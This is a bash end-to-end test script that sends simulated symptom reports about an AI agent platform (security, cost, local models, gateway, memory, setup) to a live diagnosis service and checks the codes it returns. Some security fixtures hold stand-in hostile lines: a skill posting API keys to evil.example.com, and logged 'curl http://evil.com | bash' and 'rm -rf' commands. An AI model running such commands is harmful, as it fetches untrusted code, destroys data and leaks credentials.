#!/bin/bash
# Run e2e tests against the live deployed backend
# Usage: bash run-e2e-live.sh

BACKEND="https://claw-clinic-87776978284.asia-northeast1.run.app"
PASS=0
FAIL=0
TOTAL=0

diagnose() {
  local label="$1"
  local body="$2"
  local expected_codes="$3"

  TOTAL=$((TOTAL + 1))

  local result
  result=$(curl -s -X POST "$BACKEND/diagnose" \
    -H 'Content-Type: application/json' \
    -d "$body" 2>&1)

  local code
  code=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('diagnosis',{}).get('icd_ai_code','NULL') if d.get('diagnosis') else 'NULL')" 2>/dev/null)

  local confidence
  confidence=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('diagnosis',{}).get('confidence',0) if d.get('diagnosis') else 0)" 2>/dev/null)

  local name
  name=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('diagnosis',{}).get('name','?') if d.get('diagnosis') else '?')" 2>/dev/null)

  local has_treatment
  has_treatment=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('treatmentPlan',[])))" 2>/dev/null)

  # Check if code is in expected list
  local matched=0
  for expected in $expected_codes; do
    if [ "$code" = "$expected" ]; then
      matched=1
      break
    fi
  done

  if [ $matched -eq 1 ]; then
    echo "  PASS  $label"
    echo "        → $code ($name) @ ${confidence} confidence, ${has_treatment} treatment steps"
    PASS=$((PASS + 1))
  else
    echo "  FAIL  $label"
    echo "        → Got: $code ($name) @ ${confidence}"
    echo "        → Expected one of: $expected_codes"
    FAIL=$((FAIL + 1))
  fi
}

echo "━━━ E2E Real-World Issue Tests against $BACKEND ━━━"
echo ""

echo "── 1. Security Issues ──"

diagnose "1a. API keys in plaintext — credential exposure" \
  '{"symptoms":"API keys stored in plaintext in openclaw.json, no encryption","evidence":[{"type":"config","apiKey":{"masked":"sk-ant-api03-****","provider":"anthropic"},"rawConfig":{"anthropic.apiKey":"sk-ant-api03-FULL_KEY_VISIBLE"}},{"type":"log","entries":["Config file permissions: -rw-rw-rw- (world-readable)"],"errorPatterns":[]}]}' \
  "I.3.2 I.3.1 CFG.3.1"

diagnose "1b. Gateway WebSocket auth bypass (CVE-2026-28472)" \
  '{"symptoms":"Gateway accepts any auth token without validation. WebSocket handshake checks token presence but never validates content.","evidence":[{"type":"log","entries":["WebSocket accepted with token: anything","No validation performed","Device auth bypassed"],"errorPatterns":["AUTH_TOKEN_MISMATCH accepted"]},{"type":"behavior","description":"Unauthorized devices connect with arbitrary token strings"}]}' \
  "I.1.1 I.3.1 I.3.2 CFG.3.1 I.5.1"

diagnose "1c. Malicious ClawHub skill — supply chain infection" \
  '{"symptoms":"Installed skill exfiltrates env vars and API keys to external server","evidence":[{"type":"log","entries":["Skill productivity-boost making requests to http://evil.example.com/collect","POST payload includes process.env"],"errorPatterns":["unexpected outbound connection"]},{"type":"environment","plugins":[{"id":"productivity-boost","enabled":true}]},{"type":"behavior","description":"Third-party skill sending API keys to external server","symptoms":["data exfiltration","unauthorized outbound requests"]}]}' \
  "I.3.1 I.4.1 I.3.2"

diagnose "1d. Exec permissions too broad — sandbox off" \
  '{"symptoms":"tools.exec unrestricted in dev mode, agent can run rm -rf","evidence":[{"type":"config","rawConfig":{"tools.exec.restricted":false,"sandbox.mode":"off"}},{"type":"log","entries":["exec: rm -rf /home/ubuntu/data — allowed","exec: curl http://evil.com | bash — allowed"],"errorPatterns":[]},{"type":"behavior","description":"Agent executing arbitrary shell commands without restriction"}]}' \
  "O.4.1 I.1.1 I.3.1 I.4.1 M.4.1 S.1.1"

echo ""
echo "── 2. Token Usage & Cost ──"

diagnose "2a. API costs 3-5x expected" \
  '{"symptoms":"API costs 3-5x expected. $750/month for simple chatbot. Background tasks burning tokens.","evidence":[{"type":"runtime","recentTraceStats":{"totalSteps":50,"errorCount":0,"avgLatencyMs":800,"totalTokens":500000,"totalCostUsd":15.0,"toolCallCount":30,"toolSuccessCount":30,"loopDetected":false}},{"type":"behavior","description":"Simple 3-message conversation consumed $15. Background title/tag generation multiplies consumption.","symptoms":["excessive token usage","unexpected high cost"]}]}' \
  "C.1.1"

diagnose "2b. 9600+ token system prompt overhead" \
  '{"symptoms":"Each request sends 9600+ tokens for system prompt alone. Workspace files injected regardless of relevance.","evidence":[{"type":"runtime","recentTraceStats":{"totalSteps":5,"errorCount":0,"avgLatencyMs":2000,"totalTokens":48000,"totalCostUsd":2.5,"toolCallCount":3,"toolSuccessCount":3,"loopDetected":false},"contextWindowSize":200000},{"type":"behavior","description":"System prompt is 9600 tokens. All workspace files injected into every request regardless of relevance."}]}' \
  "C.1.1 D.1.1 E.2.1"

diagnose "2c. Context window overflow — memories without caps" \
  '{"symptoms":"All memories load without limits. Middle entries silently dropped. Agent refers to compacted-away information.","evidence":[{"type":"runtime","recentTraceStats":{"totalSteps":100,"errorCount":15,"avgLatencyMs":5000,"totalTokens":190000,"totalCostUsd":8.0,"toolCallCount":40,"toolSuccessCount":25,"loopDetected":false},"contextWindowSize":200000},{"type":"behavior","description":"Agent loses coherence mid-conversation. References silently dropped context.","symptoms":["incoherent responses","context loss","memory overflow"]}]}' \
  "E.2.1 N.2.1 N.1.1 C.1.1"

echo ""
echo "── 3. Local Model / Ollama ──"

diagnose "3a. Ollama hangs indefinitely" \
  '{"symptoms":"Ollama model hangs forever. Web UI typing indicator stuck. Direct Ollama API works fine. CPU 100%.","evidence":[{"type":"runtime","modelName":"qwen2.5:32b","modelProvider":"ollama","recentTraceStats":{"totalSteps":1,"errorCount":0,"avgLatencyMs":120000,"totalTokens":0,"totalCostUsd":0,"toolCallCount":0,"toolSuccessCount":0,"loopDetected":false}},{"type":"connectivity","providers":[{"name":"ollama","endpoint":"http://localhost:11434","reachable":true,"latencyMs":50,"authStatus":"ok"}]},{"type":"behavior","description":"Ollama reachable and direct API works, but OpenClaw never receives response.","symptoms":["infinite wait","no response","ollama hang"]}]}' \
  "C.2.1 R.1.1 R.2.1 O.6.1"

diagnose "3b. Large context makes local models slow" \
  '{"symptoms":"Workspace context makes Ollama extremely slow. 30+ second responses. GPU cant handle 10k+ token system prompt.","evidence":[{"type":"runtime","modelName":"llama3:70b","modelProvider":"ollama","recentTraceStats":{"totalSteps":3,"errorCount":0,"avgLatencyMs":45000,"totalTokens":35000,"totalCostUsd":0,"toolCallCount":1,"toolSuccessCount":1,"loopDetected":false},"contextWindowSize":8192},{"type":"environment","memoryUsageMb":28000},{"type":"behavior","description":"Local model 30-45s per turn due to bloated system prompt.","symptoms":["extreme latency","slow response"]}]}' \
  "C.2.1 R.1.1 C.1.1"

diagnose "3c. Gemini outputs fake tool calls as text" \
  '{"symptoms":"Gemini outputs tool calls as plain text not structured tool_use blocks. Zero actual tool calls.","evidence":[{"type":"runtime","modelName":"gemini-2.5-flash","modelProvider":"google","recentTraceStats":{"totalSteps":15,"errorCount":0,"avgLatencyMs":1200,"totalTokens":20000,"totalCostUsd":0.3,"toolCallCount":0,"toolSuccessCount":0,"loopDetected":true}},{"type":"log","entries":["Model output: {\"tool\":\"exec\",\"args\":{\"command\":\"ls\"}}","No tool_use blocks","Tool call count: 0"],"errorPatterns":["tool call as text","no structured tool_use"]},{"type":"behavior","description":"Model writes tool JSON as text instead of structured tool_use. Zero actual tool calls.","symptoms":["fake tool calls","tool calls as text"]}]}' \
  "O.1.1 O.2.1 O.5.1"

echo ""
echo "── 4. Gateway & Connection ──"

diagnose "4a. EADDRINUSE — port conflict" \
  '{"symptoms":"Gateway wont start: EADDRINUSE port 19001. Previous process didnt shut down cleanly.","evidence":[{"type":"log","entries":["Error: listen EADDRINUSE: address already in use :::19001","Gateway failed to start"],"errorPatterns":["EADDRINUSE","address already in use"]},{"type":"connectivity","providers":[],"gatewayReachable":false}]}' \
  "CFG.2.1 R.2.1"

diagnose "4b. Stale PID lock file blocks startup" \
  '{"symptoms":"Gateway refuses to start. Stale PID lock file prevents new instance.","evidence":[{"type":"log","entries":["Error: Another gateway instance running (PID 12345)","Lock file: ~/.openclaw/gateway.pid","Process 12345 does not exist"],"errorPatterns":["stale lock file","another instance running"]},{"type":"connectivity","providers":[],"gatewayReachable":false},{"type":"behavior","description":"Crashed gateway left stale PID lock. Referenced process doesnt exist."}]}' \
  "CFG.2.1 M.2.1 R.2.1"

diagnose "4c. Gateway ignores config changes on restart" \
  '{"symptoms":"Changed model in config but gateway still uses old model after restart.","evidence":[{"type":"config","rawConfig":{"model":"claude-opus-4"}},{"type":"runtime","modelName":"claude-3-5-sonnet-20241022","modelProvider":"anthropic"},{"type":"behavior","description":"Config says claude-opus-4 but runtime uses claude-3-5-sonnet. Changes not applied on restart.","symptoms":["config mismatch","stale config"]}]}' \
  "CFG.2.1 CFG.1.1 CFG.5.1"

diagnose "4d. Systemd fails — missing HOME env var" \
  '{"symptoms":"systemd service fails. No HOME env var causes ENOENT on config paths.","evidence":[{"type":"log","entries":["ENOENT: open undefined/.openclaw/openclaw.json","systemd: openclaw-gateway.service: exited status=1/FAILURE"],"errorPatterns":["ENOENT","undefined/.openclaw","systemd FAILURE"]},{"type":"environment","os":"linux","nodeVersion":"v22.0.0"},{"type":"connectivity","providers":[],"gatewayReachable":false}]}' \
  "CFG.2.1 CFG.1.2"

echo ""
echo "── 5. Channel Integration ──"

diagnose "5a. Telegram silent reply — message not delivered" \
  '{"symptoms":"Telegram bot receives messages but never sends reply back. Agent processes successfully but delivery fails silently.","evidence":[{"type":"log","entries":["Telegram: received from chat_id=-1001234567890","Agent: processing done","Agent: response 245 tokens","Telegram: delivery failed — chat_id mangled"],"errorPatterns":["delivery failed","chat_id mangled"]},{"type":"behavior","description":"Agent generates response but it never reaches Telegram user. Negative chat IDs corrupted by session router.","symptoms":["silent failure","no reply","delivery failure"]}]}' \
  "M.1.1 O.1.1 CFG.2.1 O.2.1 D.1.1 CFG.4.1"

diagnose "5b. WhatsApp session corruption" \
  '{"symptoms":"WhatsApp keeps dropping. Session corrupts randomly, requires re-linking. ECONNRESET.","evidence":[{"type":"log","entries":["Baileys: connection closed","Session data corrupted","ECONNRESET","WhatsApp: re-link required"],"errorPatterns":["ECONNRESET","session corrupted","DisconnectReason"]},{"type":"connectivity","providers":[{"name":"whatsapp","endpoint":"wss://web.whatsapp.com","reachable":false,"error":"ECONNRESET"}]}]}' \
  "CFG.2.1 R.1.1"

diagnose "5c. Discord bot silent — missing MESSAGE_CONTENT intent" \
  '{"symptoms":"Discord bot online but never responds. message.content always empty.","evidence":[{"type":"log","entries":["Discord: received from guild 123456","message.content is empty","MESSAGE_CONTENT intent not enabled","Skipping empty message"],"errorPatterns":["MESSAGE_CONTENT intent not enabled"]},{"type":"behavior","description":"Discord bot receives events but content always empty because privileged intent not enabled.","symptoms":["discord silent","empty messages","missing intent"]}]}' \
  "CFG.2.1 CFG.1.1 O.1.1 CFG.4.1"

echo ""
echo "── 6. Memory & Persistence ──"

diagnose "6a. memoryFlush default — agent forgets everything" \
  '{"symptoms":"Agent loses all memories between restarts. memoryFlush enabled by default.","evidence":[{"type":"config","rawConfig":{"memory.flush":true,"memory.flushOnRestart":true}},{"type":"behavior","description":"No memory of previous conversations after restart. Cannot recall preferences, names, or ongoing tasks.","symptoms":["memory loss","forgets everything","no persistence"]}]}' \
  "E.2.1 N.2.1 SYS.2.1"

diagnose "6b. Memory store corruption after crash" \
  '{"symptoms":"MEMORY_STORE_CORRUPT: checksum mismatch after unclean shutdown.","evidence":[{"type":"log","entries":["MEMORY_STORE_CORRUPT: checksum mismatch at offset 48392","Failed to load memory store","Memory fallback: starting with empty store"],"errorPatterns":["MEMORY_STORE_CORRUPT","checksum mismatch"]},{"type":"behavior","description":"Memory file corrupted after crash. Single-file persistence without journaling.","symptoms":["memory corruption","data loss"]}]}' \
  "E.2.1 D.1.1 G.1.1 SYS.1.1"

diagnose "6c. No memory pruning — disk grows, search slows" \
  '{"symptoms":"Memory store 2GB over 3 months. Search takes 5+ seconds. No pruning.","evidence":[{"type":"runtime","recentTraceStats":{"totalSteps":10,"errorCount":0,"avgLatencyMs":8000,"totalTokens":15000,"totalCostUsd":0.5,"toolCallCount":5,"toolSuccessCount":5,"loopDetected":false}},{"type":"environment","memoryUsageMb":3200,"uptimeSeconds":7776000},{"type":"behavior","description":"Memory 2GB, search 5+ seconds, no pruning or compaction.","symptoms":["slow memory search","disk growing","performance degradation"]}]}' \
  "R.1.1 N.2.1 C.2.1 R.3.1"

echo ""
echo "── 7. Runtime & Performance ──"

diagnose "7a. 30+ second startup — sync plugin loading" \
  '{"symptoms":"Gateway 30+ seconds to start. Fails K8s liveness probe. Plugins loaded synchronously.","evidence":[{"type":"environment","plugins":[{"id":"claw-clinic","enabled":true},{"id":"code-review","enabled":true},{"id":"web-scraper","enabled":true},{"id":"pdf-reader","enabled":true},{"id":"image-gen","enabled":true}],"uptimeSeconds":5},{"type":"log","entries":["Plugin load: claw-clinic 2100ms","Plugin load: code-review 5400ms","Plugin load: web-scraper 8900ms","Total startup: 34.2s","K8s liveness probe failed (timeout 10s)"],"errorPatterns":["liveness probe failed","startup timeout"]},{"type":"behavior","description":"All plugins loaded synchronously. Total startup exceeds 30s.","symptoms":["slow startup","cold start","k8s probe failure"]}]}' \
  "R.2.1 R.1.1"

diagnose "7b. Memory leak — 1.8GB to 3.2GB OOM-killed" \
  '{"symptoms":"Process memory grows 1.8GB to 3.2GB over 24 hours. OOM-killed.","evidence":[{"type":"environment","memoryUsageMb":3200,"uptimeSeconds":86400},{"type":"log","entries":["RSS: 1.8GB→2.4GB→2.9GB→3.2GB","kernel: oom-killer: Kill process 12345 score 850"],"errorPatterns":["oom-killer","out of memory"]},{"type":"runtime","recentTraceStats":{"totalSteps":500,"errorCount":10,"avgLatencyMs":3000,"totalTokens":2000000,"totalCostUsd":50.0,"toolCallCount":200,"toolSuccessCount":190,"loopDetected":false}}]}' \
  "R.1.1 C.1.1 R.3.1"

diagnose "7c. Agent over-autonomy — unnecessary reasoning loops" \
  '{"symptoms":"Agent goes on tangents. List files becomes 20-step investigation with READMEs and summaries.","evidence":[{"type":"runtime","recentTraceStats":{"totalSteps":25,"errorCount":0,"avgLatencyMs":2000,"totalTokens":80000,"totalCostUsd":3.5,"toolCallCount":20,"toolSuccessCount":20,"loopDetected":false}},{"type":"behavior","description":"Agent over-interprets simple instructions. Wanders far beyond original request.","symptoms":["over-autonomy","scope creep","unnecessary steps"]}]}' \
  "N.3.1 P.1.1 C.1.1 E.1.1 N.5.1"

diagnose "7d. Tool execution latency spikes" \
  '{"symptoms":"Tool latency varies 200ms to 10+ seconds for identical ops. No timeout. Blocks event loop.","evidence":[{"type":"runtime","recentTraceStats":{"totalSteps":30,"errorCount":5,"avgLatencyMs":4500,"totalTokens":30000,"totalCostUsd":1.0,"toolCallCount":25,"toolSuccessCount":20,"loopDetected":false}},{"type":"log","entries":["Tool latency: 180ms,220ms,8500ms,190ms,12000ms,250ms","Event loop blocked 8.3s","No tool timeout configured"],"errorPatterns":["event loop blocked","latency spike"]}]}' \
  "C.2.1 R.1.1"

echo ""
echo "── 8. Installation & Setup ──"

diagnose "8a. Config ENOENT — relative path resolution" \
  '{"symptoms":"Cant find config file. Path resolves relative to cwd not binary. Common with systemd/Docker.","evidence":[{"type":"log","entries":["ENOENT: open ./openclaw.json","Config resolution: cwd=/root → not found","Expected: /home/ubuntu/.openclaw/openclaw.json"],"errorPatterns":["ENOENT","config not found"]},{"type":"connectivity","providers":[],"gatewayReachable":false}]}' \
  "CFG.2.1 CFG.1.2"

diagnose "8b. Node.js too old — syntax errors" \
  '{"symptoms":"OpenClaw crashes with SyntaxError. Using Node 18, requires Node 22.","evidence":[{"type":"log","entries":["SyntaxError: Unexpected token ??=","Node.js v18.20.2"],"errorPatterns":["SyntaxError","Unexpected token"]},{"type":"environment","nodeVersion":"v18.20.2","os":"linux"}]}' \
  "CFG.2.1 CFG.1.1 O.3.1 CFG.4.1"

echo ""
echo "── 9. Operational / DevOps ──"

diagnose "9a. Upgrade breaks config — keys renamed" \
  '{"symptoms":"After upgrade, gateway wont start. Config keys renamed without migration.","evidence":[{"type":"log","entries":["Warning: unknown config key model (did you mean agent.model?)","Error: required key agent.model not found"],"errorPatterns":["unknown config key","required key not found"]},{"type":"environment","openclawVersion":"2026.3.2"},{"type":"config","rawConfig":{"model":"claude-opus-4","auth.token":"secret123"}}]}' \
  "CFG.2.1 CFG.1.1 O.3.1 CFG.5.1"

diagnose "9b. Cron jobs never fire — config defaults wrong" \
  '{"symptoms":"Cron job configured but never fires. Per-job enabled defaults to false. Silent failure.","evidence":[{"type":"config","rawConfig":{"cron.enabled":true,"cron.jobs":[{"name":"daily-summary","schedule":"0 9 * * *"}]}},{"type":"log","entries":["Cron: loaded 1 job(s)","Cron: daily-summary enabled: false (default), skipping"],"errorPatterns":[]},{"type":"behavior","description":"Cron job configured but never fires. Per-job enabled defaults to false. No errors.","symptoms":["cron not running","scheduled task silent failure"]}]}' \
  "CFG.2.1 CFG.1.1 N.3.1 CFG.5.1"

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Results: $PASS passed, $FAIL failed out of $TOTAL tests"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
